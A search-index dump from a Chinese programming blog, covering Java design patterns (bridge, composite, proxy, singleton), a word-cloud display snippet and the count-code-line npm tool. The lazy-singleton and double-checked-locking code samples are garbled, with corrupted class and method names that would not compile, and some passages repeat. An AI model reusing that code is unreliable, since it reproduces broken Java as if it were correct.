词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["Java后端"],"content":"三、前端结果显示 后端传的数据是base64编码后的字符串，怎么显示在前端？ uni.request({ url: config.baseUrl + '/liu/wordscloud', method: 'GET', success: res =\u003e { console.log(typeof(res.data)) this.imageHerf='data:image/jpeg;base64,'+res.data }, fail: (res) =\u003e { console.log(\"词云失败结果\") console.log(res) } }) \u003cview\u003e \u003cvan-image class=\"code text-right\" width=\"100%\" height=\"250px\" fit=\"cover\" mode=\"\" :src=\"imageHerf.replace(/[\\r\\n]/g,'')\" /\u003e \u003c/view\u003e ","date":"2021-05-09","objectID":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/:3:0","tags":["NLP"],"title":"Stanford CoreNLP 词云","uri":"/posts/stanford-corenlp-%E8%AF%8D%E4%BA%91/"},{"categories":["设计模式"],"content":"模式动机 **蜡笔：**颜色和型号两个不同的变化维度（即两个不同的变化原因）耦合在一起，无论是对颜色进行扩展还是对型号进行扩展都势必会影响另一个维度 **毛笔：**颜色和型号实现了分离，增加新的颜色或者型号对另一方没有任何影响 ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:1:0","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 桥接模式(Bridge Pattern)：将抽象部分与它的实现部分分离，使它们都可以独立地变化。 对象结构型模式，又称为柄体(Handle and Body)模式或接口(Interface)模式 用抽象关联取代了传统的多层继承 将类之间的静态继承关系转换为动态的对象组合关系 ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:2:0","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式结构 ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:3:0","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 模拟毛笔：实例说明 •现需要提供大中小3种型号的画笔，能够绘制5种不同颜色，如果使用蜡笔，我们需要准备3*5=15支蜡笔，也就是说必须准备15个具体的蜡笔类。而如果使用毛笔的话，只需要3种型号的毛笔，外加5个颜料盒，用3+5=8个类就可以实现15支蜡笔的功能。本实例使用桥接模式来模拟毛笔的使用过程。 ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:4:0","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"代码 package com.bridge; public interface Color { public void paint(String penType); } package com.bridge; public class Blue implements Color { @Override public void paint(String penType) { // TODO Auto-generated method stub System.out.println(\"使用\"+penType+\"涂蓝色\"); } } package com.bridge; public abstract class Pen { protected Color color; public void setColor(Color color) { this.color = color; } public abstract void draw(); } package com.bridge; public class SmallPen extends Pen { @Override public void draw() { // TODO Auto-generated method stub System.out.println(\"准备用小号毛笔画画：\"); color.paint(\"小号毛笔\"); } } package com.bridge; import java.io.File; import javax.xml.parsers.*; import org.w3c.dom.*; public class XMLUtil { public static Object getBean(String args) { try { //创建DOM文档对象 DocumentBuilderFactory dFactory=DocumentBuilderFactory.newInstance(); DocumentBuilder builder=dFactory.newDocumentBuilder(); Document doc=builder.parse(new File(\"src/com/bridge/config.xml\")); //获取包含类名的文本节点 NodeList nl=doc.getElementsByTagName(\"className\"); Node classNode=null; //nl.item(0).getFirstChild(); String cName=null; //classNode.getNodeValue(); if(args.equals(\"color\")) { classNode=nl.item(0).getFirstChild(); } else if(args.equals(\"pen\")) { classNode=nl.item(1).getFirstChild(); } cName=classNode.getNodeValue(); //通过类名生成实例对象并返回 Class c=Class.forName(cName); Object obj=c.newInstance(); return obj; } catch(Exception ex) { ex.printStackTrace(); return null; } } } \u003c?xml version=\"1.0\"?\u003e \u003cconfig\u003e \u003cclassName\u003ecom.bridge.Green\u003c/className\u003e \u003cclassName\u003ecom.bridge.BigPen\u003c/className\u003e \u003c/config\u003e package com.bridge; public class Client { public static void main(String[] args) { // TODO Auto-generated method stub Color color=(Color)XMLUtil.getBean(\"color\"); Pen pen=(Pen)XMLUtil.getBean(\"pen\"); pen.setColor(color); pen.draw(); } } ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:4:1","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 分离抽象接口及其实现部分 可以取代多层继承方案，极大地减少了子类的个数 提高了系统的可扩展性，在两个变化维度中任意扩展一个维度，不需要修改原有系统，符合开闭原则 ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:5:0","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 会增加系统的理解与设计难度，由于关联关系建立在抽象层，要求开发者一开始就要针对抽象层进行设计与编程 正确识别出系统中两个独立变化的维度并不是一件容易的事情 ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:6:0","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 需要在抽象化和具体化之间增加更多的灵活性，避免在两个层次之间建立静态的继承关系 抽象部分和实现部分可以以继承的方式独立扩展而互不影响 一个类存在两个（或多个）独立变化的维度，且这两个（或多个）维度都需要独立地进行扩展 不希望使用继承或因为多层继承导致系统类的个数急剧增加的系统 ","date":"2021-05-05","objectID":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/:7:0","tags":["桥接模式"],"title":"桥接模式","uri":"/posts/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式动机 在树形目录结构中，包含文件和文件夹两类不同的元素 在文件夹中可以包含文件，还可以继续包含子文件夹 在文件中不能再包含子文件或者子文件夹 文件夹 \u003c–\u003e容器(Container) 文件 \u003c–\u003e叶子(Leaf) 如何将容器对象和叶子对象进行递归组合，使得用户在使用时无须对它们进行区分，可以一致地对待容器对象和叶子对象？ à 组合模式 ","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:1:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 组合模式(Composite Pattern)：组合多个对象形成树形结构以表示“部分-整体”的结构层次。组合模式对单个对象（即叶子对象）和组合对象（即容器对象）的使用具有一致性。 对象结构型模式 将对象组织到树形结构中，可以用来描述整体与部分的关系 ","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:2:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式结构 模式代码实例 package com.composite; public interface Component { //如果是叶子结点，则打印它的名称； //如果是容器结点，则打印它的名称，并利用foreach语句调用每个子结点的operation方法 public void operation(); //添加一个子节点 public void add(Component c); //删除一个子节点 public void remove(Component c); //获取一个子结点 public Component getChild(int i); } package com.composite; public class Leaf implements Component { public String leafname; public Leaf(String leafname) { this.leafname = leafname; } @Override public void operation() { // TODO Auto-generated method stub System.out.println(\"当前结点是叶子结点，叶子名称是 \"+leafname); } @Override public void add(Component c) { // TODO Auto-generated method stub System.out.println(\"叶子结点不能执行add方法\"); } @Override public void remove(Component c) { // TODO Auto-generated method stub System.out.println(\"叶子结点不能执行remove方法\"); } @Override public Component getChild(int i) { // TODO Auto-generated method stub System.out.println(\"叶子结点不能执行getChild方法\"); return null; } } package com.composite; import java.util.ArrayList; public class Composite implements Component { private String compositename; private ArrayList list=new ArrayList(); public Composite(String compositename) { this.compositename = compositename; } @Override public void operation() { // TODO Auto-generated method stub System.out.println(\"当前结点是容器结点，容器名称是 \"+compositename); for(Object child:list) { Component c=(Component)child; c.operation(); } } @Override public void add(Component c) { // TODO Auto-generated method stub list.add(c); System.out.println(\"添加了一个子节点\"); } @Override public void remove(Component c) { // TODO Auto-generated method stub list.remove(c); System.out.println(\"删除了一个子节点\"); } @Override public Component getChild(int i) { // TODO Auto-generated method stub Component c=(Component)list.get(i); return c; } } package com.composite; public class Client { public static void main(String[] args) { // TODO Auto-generated method stub Component root=new Composite(\"C1-1\"); Component C21=new Composite(\"C2-1\"); Component L22=new Leaf(\"L2-2\"); Component C23=","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:3:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 透明组合模式 抽象构件Component中声明了所有用于管理成员对象的方法，包括add()、remove()，以及getChild()等方法 在客户端看来，叶子对象与容器对象所提供的方法是一致的，客户端可以一致地对待所有的对象 缺点是不够安全，因为叶子对象和容器对象在本质上是有区别的 安全组合模式 抽象构件Component中没有声明任何用于管理成员对象的方法，而是在Composite类中声明并实现这些方法 对于叶子对象，客户端不可能调用到这些方法 缺点是不够透明，客户端不能完全针对抽象编程，必须有区别地对待叶子构件和容器构件 ","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:4:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 可以清楚地定义分层次的复杂对象，表示对象的全部或部分层次，让客户端忽略了层次的差异，方便对整个层次结构进行控制 客户端可以一致地使用一个组合结构或其中单个对象，不必关心处理的是单个对象还是整个组合结构，简化了客户端代码 增加新的容器构件和叶子构件都很方便，符合开闭原则 为树形结构的面向对象实现提供了一种灵活的解决方案 ","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:5:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 在增加新构件时很难对容器中的构件类型进行限制 ","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:6:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 在具有整体和部分的层次结构中，希望通过一种方式忽略整体与部分的差异，客户端可以一致地对待它们 在一个使用面向对象语言开发的系统中需要处理一个树形结构 在一个系统中能够分离出叶子对象和容器对象，而且它们的类型不固定，需要增加一些新的类型 ","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:7:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"实例 在水果盘(Plate)中有一些水果，如苹果(Apple)、香蕉(Banana)、梨子(Pear)，当然大水果盘中还可以有小水果盘，现需要对盘中的水果进行遍历（吃），当然如果对一个水果盘执行“吃”方法，实际上就是吃其中的水果。使用组合模式模拟该场景 ","date":"2021-05-05","objectID":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/:8:0","tags":["组合模式"],"title":"组合模式","uri":"/posts/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式动机 通过引入一个新的对象（如小图片和远程代理对象）来实现对真实对象的操作，或者将新的对象作为真实对象的一个替身 引入代理对象来间接访问一个对象 代理模式 ","date":"2021-05-05","objectID":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/:1:0","tags":["代理模式"],"title":"代理模式","uri":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 代理模式(Proxy Pattern) ：给某一个对象提供一个代理，并由代理对象控制对原对象的引用 对象结构型模式 代理对象可以在客户端和目标对象之间起到中介的作用 通过代理对象去掉客户不能看到的内容和服务或者添加客户需要的额外的新服务 ","date":"2021-05-05","objectID":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/:2:0","tags":["代理模式"],"title":"代理模式","uri":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式结构 代理模式代码实例 ","date":"2021-05-05","objectID":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/:3:0","tags":["代理模式"],"title":"代理模式","uri":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 远程代理(Remote Proxy)：为一个位于不同的地址空间的对象提供一个本地的代理对象，这个不同的地址空间可以在同一台主机中，也可以在另一台主机中，远程代理又称为大使(Ambassador) 虚拟代理(Virtual Proxy)：如果需要创建一个资源消耗较大的对象，先创建一个消耗相对较小的对象来表示，真实对象只在需要时才会被真正创建 保护代理(Protect Proxy)：控制对一个对象的访问，可以给不同的用户提供不同级别的使用权限 缓冲代理(Cache Proxy)：为某一个目标操作的结果提供临时的存储空间，以便多个客户端可以共享这些结果 智能引用代理(Smart Reference Proxy)：当一个对象被引用时，提供一些额外的操作，例如将对象被调用的次数记录下来等 ","date":"2021-05-05","objectID":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/:4:0","tags":["代理模式"],"title":"代理模式","uri":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 能够协调调用者和被调用者，在一定程度上降低了系统的耦合度 客户端可以针对抽象主题角色进行编程，增加和更换代理类无须修改源代码，符合开闭原则，系统具有较好的灵活性和可扩展性 远程代理：可以将一些消耗资源较多的对象和操作移至性能更好的计算机上，提高了系统的整体运行效率 虚拟代理：通过一个消耗资源较少的对象来代表一个消耗资源较多的对象，可以在一定程度上节省系统的运行开销 缓冲代理：为某一个操作的结果提供临时的缓存存储空间，以便在后续使用中能够共享这些结果，优化系统性能，缩短执行时间 保护代理：可以控制对一个对象的访问权限，为不同用户提供不同级别的使用权限 ","date":"2021-05-05","objectID":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/:5:0","tags":["代理模式"],"title":"代理模式","uri":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢（例如保护代理） 实现代理模式需要额外的工作，而且有些代理模式的实现过程较为复杂（例如远程代理） ","date":"2021-05-05","objectID":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/:6:0","tags":["代理模式"],"title":"代理模式","uri":"/posts/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/"},{"categories":["前端"],"content":"count-code-line ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:0:0","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"特性 支持计算代码行数和代码字符数 丰富的配置文件，支持匹配任意规则的文件或文件夹 支持生成计算结果的json 支持全局安装命令行使用 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:1:0","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"安装 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:2:0","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"1.1 全局安装 npm i count-code-line -g ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:2:1","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"1.2 本地安装 npm i count-code-line -D 1.2 本地安装 npm i count-code-line -D 1 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:2:2","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"使用 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:3:0","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"2.1 全局安装使用 在任意项目内打开命令行工具，运行一下命令即可 count-code-line 运行成功会在根目录下输出 count.output.json 文件 运行成功会在根目录下输出 count.output.json 文件 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:3:1","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"2.2 本地安装使用 在 package.json 文件中 的scripts属性中加入如下配置 ... \"scripts\": { ... \"count\": \"count-code-line\" }, ... 然后在根目录下运行 npm run count 运行成功会在根目录下输出 count.output.json 文件 运行成功会在根目录下输出 count.output.json 文件 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:3:2","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"2.3 nodejs 引用 const count = require('count-code-line'); count(); ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:3:3","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"配置文件 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:4:0","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"3.1 默认配置文件及配置项 count-code-line 支持自定义配置文件，以下是默认配置 module.exports = { includes: [], // 需要包含的目录及文件 默认全部包含 excludes: [], // 需要排除的目录及文件 默认全部移除 defaultExcludes: [ // 默认排除的目录及文件 '.git', '.vscode', 'node_modules', 'package.json', 'package-lock.json', 'yarn-lock.json', 'count.output.json', ], defaultExcludesFileType: [ // 默认排除的文件类型 '.zip', '.rar', '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.mp3', '.wma', '.wav', '.mp4', '.flv', '.mov', '.avi', '.wmv', '.rmvb ', '.ogg', '.avi', '.ppt', '.pptx', '.doc','.docx','.xls','.xlsx','.psd','.ttf','.fon','.exe','.msi', ], output: 'count.output.json', // 默认的输出结果文件 outputTrace: '', // 配置输出 trace 结果的文件，默认不输出 encodings: [ // 支持的文件编码，对于不支持的文件将忽略 'ascii', 'utf8', 'utf-8', 'unicode' ] }; ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:4:1","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"3.2 自定义配置文件 在项目根目录下新建 count.config.js 文件 写入上述配置覆盖默认配置即可 3.2 自定义配置文件 在项目根目录下新建 count.config.js 文件 写入上述配置覆盖默认配置即可 对于为空的配置项，将使用默认配置 ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:4:2","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["前端"],"content":"3.3 目录匹配规则 includes excludes 等配置项均支持模糊匹配，匹配规则如下 ‘a’ 将匹配 根目录下 a 文件夹内的所有文件及文件夹；正则： new RegExp(^/a/.*) ‘a/a.js’ 仅匹配指定文件 ‘a/’ 仅匹配 a 文件夹内的所有子文件； 正则： new RegExp(^/a/([^/])$) ‘a/**/.js’ 匹配 a 文件夹内的所有以 .js 为后缀的文件； 正则： new RegExp(^/a/([^/]).js$) ‘a/.js’ 仅匹配 a 文件夹内的所有以 .js 为后缀的子文件； 正则： new RegExp(^/a/([^/]).js$) ","date":"2021-05-04","objectID":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/:4:3","tags":[],"title":"统计代码行","uri":"/posts/%E7%BB%9F%E8%AE%A1%E4%BB%A3%E7%A0%81%E8%A1%8C/"},{"categories":["设计模式"],"content":"模式动机 如何确保一个类只有一个实例并且这个实例易于被访问？ 让类自身负责创建和保存它的唯一实例，并保证不能创建其他实例，并且提供一个访问该实例的方法 ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:1:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式定义 单例模式(Singleton Pattern)：确保某一个类只有一个实例，而且自行实例化并向整个系统提供这个实例，这个类称为单例类，它提供全局访问的方法。 单例模式的要点有三个： 某个类只能有一个实例 必须自行创建这个实例 必须自行向整个系统提供这个实例 单例模式是一种对象创建型模式 ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:2:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式结构 ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:3:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式分析 单例模式的实现 私有构造函数 静态私有成员变量（自身类型） 静态公有的工厂方法 ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:4:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"饿汉式单例类(Eager Singleton) 代码实现： public class EagerSingleton { private static final EagerSingleton instance = new EagerSingleton(); private EagerSingleton(){ } public static EagerSingleton getInstance() { return instance; } } ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:4:1","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"懒汉式单例类 延时加载： public class LazySingleton { private static LazySingletom instance = null; private IazySingleton( i} public static LazySingleton getInstanceO { if (instance == null){ instance = new LazMSingleton(); } return instance; } } 多个线程同时访问将导致创建多个单例对象!怎么办? instance = new LazMSingleton(); 需要较长时间 synchronized锁方法： public class LazySingleton { private static LazySingletom instance = null; private IazySingleton( i} synchronized public static LazySingleton getInstanceO { if (instance == null){ instance = new LazMSingleton(); } return instance; } } synchronized锁代码段 if (instance == null){ synchronized(LazMSingleton.class){ instance = new LazMSingleton(); } } return instance; ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:4:2","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"Double-Check Locking双重检查锁定 public class LazySingleton { private volatile static LazySingletom instance = null; private IazySingleton( i} public static LazySingleton getInstanceO { //第一重判断 if (instance == null){ //锁定代码块 synchronized(LazMSingleton.class){ //第二重判断 if(instance == null){ instance = new LazMSingleton(); } } } return instance; } } ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:4:3","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"饿汉式单例类与懒汉式单例类的比较 饿汉式单例类：无须考虑多个线程同时访问的问题；调用速度和反应时间优于懒汉式单例；资源利用效率不及懒汉式单例；系统加载时间可能会比较长 懒汉式单例类：实现了延迟加载；必须处理好多个线程同时访问的问题；需通过双重检查锁定等机制进行控制，将导致系统性能受到一定影响 //Initialization on Demand Holder public class Singleton { private Singleton() { } //静态内部类 private static class HolderClass { private final static Singleton instance = new Singleton(); } public static Singleton getInstance() { return HolderClass.instance; } public static void main(String args[]) { Singleton s1, s2; s1 = Singleton.getInstance(); s2 = Singleton.getInstance(); System.out.println(s1 == s2); } } 控制台输出true ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:5:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式实例 在操作系统中，打印池(Print Spooler)是一个用于管理打印任务的应用程序，通过打印池用户可以删除、中止或者改变打印任务的优先级，在一个系统中只允许运行一个打印池对象，如果重复创建打印池则抛出异常。现使用单例模式来模拟实现打印池的设计。 自定义异常类 public class PrintSpoolerException extends Exception { public PrintSpoolerException(String message){ super(message); } } 单例类 public class PrintSpoolerSingleton { private static PrintSpoolerSingleton instance=null; private PrintSpoolerSingleton(){} public static PrintSpoolerSingleton getInstance() throws PrintSpoolerException { if(instance==null){ System.out.println(\"创建打印池\"); instance=new PrintSpoolerSingleton(); } else{ throw new PrintSpoolerException(\"打印池正在工作中\"); } return instance; } public void manageJobs(){ System.out.println(\"管理打印任务\"); } } 客户端类： public class Client { public static void main(String args[]){ PrintSpoolerSingleton ps1,ps2; try{ ps1=PrintSpoolerSingleton.getInstance(); ps1.manageJobs(); }catch (PrintSpoolerException e){ System.out.println(e.getMessage()); } System.out.println(\"----------------\"); try{ ps2=PrintSpoolerSingleton.getInstance(); ps2.manageJobs(); }catch (PrintSpoolerException e){ System.out.println(e.getMessage()); } } } 结果： 创建打印池 管理打印任务 ---------------- 打印池正在工作中 Process finished with exit code 0 ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:6:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"优点 提供了对唯一实例的受控访问 可以节约系统资源，提高系统的性能 允许可变数目的实例（多例类） ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:7:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"缺点 扩展困难（缺少抽象层） 单例类的职责过重 由于自动垃圾回收机制，可能会导致共享的单例对象的状态丢失 ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:8:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"应用场景 系统只需要一个实例对象，或者因为资源消耗太大而只允许创建一个对象 客户调用类的单个实例只允许使用一个公共访问点，除了该公共访问点，不能通过其他途径访问该实例 ","date":"2021-05-02","objectID":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/:9:0","tags":["单例模式"],"title":"单例模式","uri":"/posts/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"},{"categories":["设计模式"],"content":"模式动机 现实生活： 不兼容：生活用电220V ßà 笔记电脑20V 引入 AC Adapter（交流电适配器） 软件开发： 存在不兼容的结构，例如方法名不一致 引入适配器模式 